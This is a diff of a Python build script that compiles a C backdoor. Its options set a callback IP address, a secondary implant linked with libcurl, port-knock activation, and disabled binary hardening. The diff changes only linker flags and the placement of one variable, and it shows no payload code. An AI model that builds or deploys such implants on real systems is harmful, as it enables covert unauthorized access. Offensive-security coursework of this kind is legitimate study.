@@ -78,7 +78,7 @@ parser.add_argument("-endDate", "--endDate",type=str, metavar='',
 args = parser.parse_args()
 #print(args)
 
-cmd = ["gcc", "-Wall", "backdoor.c", "-o", args.outputName, "-no-pie", "-Wl,-z,norelro", "-fno-stack-protector"]
+cmd = ["gcc", "-Wall", "backdoor.c", "-o", args.outputName, "-no-pie", "-Wl,-z,norelro", "-fno-stack-protector", "-lcurl", "-lm"]
 
 arg = str(args.ipAddress)
 #DEBUG
@@ -167,12 +167,13 @@ if args.static:
     cmd.insert(3, "-D STATIC=1")
 #SECONDARYIMPLANT
 if args.secImp:
-    cmd.insert(3, "-lcurl")
+    #cmd.insert(3, "-lcurl")
     cmd.insert(3, "-D SECIMP")
 
+listOfNumbers = []
 if args.knock:
     count = 0
-    listOfNumbers = [] 
+    #listOfNumbers = [] 
     key = 34567
     target = key
     number = 4
@@ -189,7 +190,8 @@ if args.knock:
     cmd.insert(3, "-D MULTI_KNOCK={" + str(listnum).strip(' []') + "}")
 
     cmd.insert(3,"-D NUM_PORTS=" + str(len(listOfNumbers)))
-    cmd.insert(3,"-lpcap")
+    
+cmd.insert(3,"-lpcap")
 print(cmd)
 
 subprocess.run(cmd)
